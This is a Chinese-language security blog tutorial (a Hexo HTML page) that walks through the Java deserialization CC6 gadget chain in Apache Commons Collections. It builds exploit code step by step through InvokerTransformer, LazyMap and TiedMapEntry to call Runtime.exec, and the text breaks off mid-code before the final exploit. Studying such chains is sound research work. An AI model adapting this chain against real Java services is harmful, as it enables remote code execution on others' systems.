@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="参考链接https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1yP4y1p7N7https:&#x2F;&#x2F;y0n3er.github.io&#x2F;undefined&#x2F;29590.htmlhttps:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial&#x2F;blob&#x2F;master&#x2F;src&#x2F;main&#x2F;java&#x2F;ysoserial&#x2F;payloads&#x2F;CommonsCollections6.java 环">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化 CC6链">
+<meta property="og:url" content="https://jaspersec.top/posts/2328081059.html">
+<meta property="og:site_name" content="Jasper_sec">
+<meta property="og:description" content="参考链接https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1yP4y1p7N7https:&#x2F;&#x2F;y0n3er.github.io&#x2F;undefined&#x2F;29590.htmlhttps:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial&#x2F;blob&#x2F;master&#x2F;src&#x2F;main&#x2F;java&#x2F;ysoserial&#x2F;payloads&#x2F;CommonsCollections6.java 环">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692018425107-a9b888e2-7eec-4681-b338-57c940947fe1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692018524310-5fe6b1d1-0e96-4bb9-9299-ee79a9e93ea7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692075018562-55090e80-36e0-4455-991f-a4d1f6ea5c08.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692066184335-ad79bc35-d266-4662-8950-037fd6a3d4c6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692066256460-d772e9a1-bb2a-402d-b2db-4032356c16bd.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692066484761-bf387640-5b3c-47a2-ab8f-9a31cbd8f8ec.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692066662374-ab80cc80-c523-48cd-99bc-7030d19d4b8d.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692067851469-5202515b-34a4-4cb7-b124-6ddda08b1405.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692067920768-30a7cc15-5aa8-4995-b5c9-7f2268686c98.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692068227204-ac45031b-8116-4e8f-ba2c-d780c34eb0aa.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692068792272-7f642f99-eb3d-4e50-988a-6f1866e93d1b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692069253722-701ae1f0-e2cc-45cf-8ac1-ea410d10e997.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692069369601-7d660f9f-bf2b-431e-8ae7-b1a47ef3c9ff.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692069477132-1a1c636e-7007-4721-a115-7b9227cedb47.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692074328801-197d6508-9c38-4ba6-9b8f-4da04a6c7357.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692074565632-03a8eed7-de85-4946-bfc2-204be142c233.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692075018562-55090e80-36e0-4455-991f-a4d1f6ea5c08.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692075305204-48155661-53a8-4b26-be39-ab7964945097.png">
+<meta property="article:published_time" content="2023-12-23T18:32:20.000Z">
+<meta property="article:modified_time" content="2025-03-31T22:09:47.222Z">
+<meta property="article:author" content="Jasper_sec">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="CC">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692018425107-a9b888e2-7eec-4681-b338-57c940947fe1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java反序列化 CC6链</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Jasper_sec" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span> 
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/3172811409.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/1914772217.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/posts/2328081059.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/posts/2328081059.html&text=Java反序列化 CC6链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/posts/2328081059.html&title=Java反序列化 CC6链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/posts/2328081059.html&is_video=false&description=Java反序列化 CC6链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java反序列化 CC6链&body=Check out this article: https://jaspersec.top/posts/2328081059.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/posts/2328081059.html&title=Java反序列化 CC6链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/posts/2328081059.html&title=Java反序列化 CC6链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/posts/2328081059.html&title=Java反序列化 CC6链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/posts/2328081059.html&title=Java反序列化 CC6链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/posts/2328081059.html&name=Java反序列化 CC6链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/posts/2328081059.html&t=Java反序列化 CC6链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <!-- 
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">调用链分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E5%86%99Exp"><span class="toc-number">4.</span> <span class="toc-text">编写Exp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#lazyMap-get"><span class="toc-number">4.1.</span> <span class="toc-text">lazyMap#get()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TiedMapEntry-getvalue"><span class="toc-number">4.2.</span> <span class="toc-text">TiedMapEntry#getvalue()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TiedMapEntry-hashCode"><span class="toc-number">4.3.</span> <span class="toc-text">TiedMapEntry#hashCode()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap-hash"><span class="toc-number">4.4.</span> <span class="toc-text">HashMap#hash()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap-readObject"><span class="toc-number">4.5.</span> <span class="toc-text">HashMap#readObject()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%BB%88Exp"><span class="toc-number">4.6.</span> <span class="toc-text">最终Exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">5.</span> <span class="toc-text">注意事项</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+     -->
+    <div id="toc">
+      <div id="toc-div" class="toc-article" >
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">调用链分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E5%86%99Exp"><span class="toc-number">4.</span> <span class="toc-text">编写Exp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#lazyMap-get"><span class="toc-number">4.1.</span> <span class="toc-text">lazyMap#get()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TiedMapEntry-getvalue"><span class="toc-number">4.2.</span> <span class="toc-text">TiedMapEntry#getvalue()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TiedMapEntry-hashCode"><span class="toc-number">4.3.</span> <span class="toc-text">TiedMapEntry#hashCode()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap-hash"><span class="toc-number">4.4.</span> <span class="toc-text">HashMap#hash()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap-readObject"><span class="toc-number">4.5.</span> <span class="toc-text">HashMap#readObject()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%BB%88Exp"><span class="toc-number">4.6.</span> <span class="toc-text">最终Exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">5.</span> <span class="toc-text">注意事项</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li></ol>
+        
+      </div>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Java反序列化 CC6链
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Jasper_sec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-12-23T18:32:20.000Z" class="dt-published" itemprop="datePublished">2023-12-24</time>
+        
+        (Updated: <time datetime="2025-03-31T22:09:47.222Z" class="dt-updated" itemprop="dateModified">2025-04-01</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CC/" rel="tag">CC</a>, <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1yP4y1p7N7">https://www.bilibili.com/video/BV1yP4y1p7N7</a><br><a target="_blank" rel="noopener" href="https://y0n3er.github.io/undefined/29590.html">https://y0n3er.github.io/undefined/29590.html</a><br><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java#L21">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java</a></p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>jdk_8u71：<a target="_blank" rel="noopener" href="https://blog.lupf.cn/articles/2022/02/20/1645352101537.html">https://blog.lupf.cn/articles/2022/02/20/1645352101537.html</a><br>虚拟机安装以后拷贝出来</p>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692018425107-a9b888e2-7eec-4681-b338-57c940947fe1.png" alt="image.png"></p>
+<p>然后在project structure里配置Project、Modules、SDKs</p>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692018524310-5fe6b1d1-0e96-4bb9-9299-ee79a9e93ea7.png" alt="image.png"></p>
+<p><strong>注意：调试器的这里关闭这两个选项，不然debug会自动执行一些方法，导致变量值改变！</strong></p>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692075018562-55090e80-36e0-4455-991f-a4d1f6ea5c08.png" alt="image.png"></p>
+<h1 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h1><p>yoserial的调用链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">	Gadget chain:</span><br><span class="line">	    java.io.ObjectInputStream.readObject()</span><br><span class="line">            java.util.HashMap.readObject()</span><br><span class="line">                java.util.HashMap.put()</span><br><span class="line">                java.util.HashMap.hash()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                            java.lang.reflect.Method.invoke()</span><br><span class="line">                                java.lang.Runtime.exec()</span><br><span class="line"></span><br><span class="line">    by @matthias_kaiser</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+<p>前半段和CC1-LazyMap是一样的，只分析一下LazyMap上面的调用。</p>
+<ol>
+<li>TiedMapEntry#getValue()调用了map.get(key)</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692066184335-ad79bc35-d266-4662-8950-037fd6a3d4c6.png" alt="image.png"></p>
+<ol start="2">
+<li>TiedMapEntry#hashCode()调用了TiedMapEntry#getValue()</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692066256460-d772e9a1-bb2a-402d-b2db-4032356c16bd.png" alt="image.png"></p>
+<ol start="3">
+<li>HashMap#hash(Object key)调用了key.hashCode()</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692066484761-bf387640-5b3c-47a2-ab8f-9a31cbd8f8ec.png" alt="image.png"></p>
+<ol start="4">
+<li>HashMap#readObject()调用了HashMap#hash(key)</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692066662374-ab80cc80-c523-48cd-99bc-7030d19d4b8d.png" alt="image.png"></p>
+<p>所以只需要一个HashMap序列化，key指定为TiedMapEntry对象，<br>再把TiedMapEntry对象的map属性改成LazyMap对象，就会调到它的get了。</p>
+<h1 id="编写Exp"><a href="#编写Exp" class="headerlink" title="编写Exp"></a>编写Exp</h1><h2 id="lazyMap-get"><a href="#lazyMap-get" class="headerlink" title="lazyMap#get()"></a>lazyMap#get()</h2><p>先确定lazyMap.get()能触发命令执行，Exp如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        lazyMap.get(<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692067851469-5202515b-34a4-4cb7-b124-6ddda08b1405.png" alt="image.png"></p>
+<h2 id="TiedMapEntry-getvalue"><a href="#TiedMapEntry-getvalue" class="headerlink" title="TiedMapEntry#getvalue()"></a>TiedMapEntry#getvalue()</h2><p>然后再构造TiedMapEntry的对象，观察是否能调到get()<br>注意构造函数要把lazyMap传进去，key随便取</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        <span class="comment">// lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key2&quot;</span>);</span><br><span class="line">        tiedMapEntry.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692067920768-30a7cc15-5aa8-4995-b5c9-7f2268686c98.png" alt="image.png"></p>
+<h2 id="TiedMapEntry-hashCode"><a href="#TiedMapEntry-hashCode" class="headerlink" title="TiedMapEntry#hashCode()"></a>TiedMapEntry#hashCode()</h2><p>hashCode()经常用来和入口类HashMap对接，需要比较敏感。<br>这里和上一步没差别，加了一层函数调用而已，为的是方便连上后面的入口类HashMap：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        <span class="comment">// lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key2&quot;</span>);</span><br><span class="line">        <span class="comment">// tiedMapEntry.getValue();</span></span><br><span class="line">        tiedMapEntry.hashCode();</span><br><span class="line">    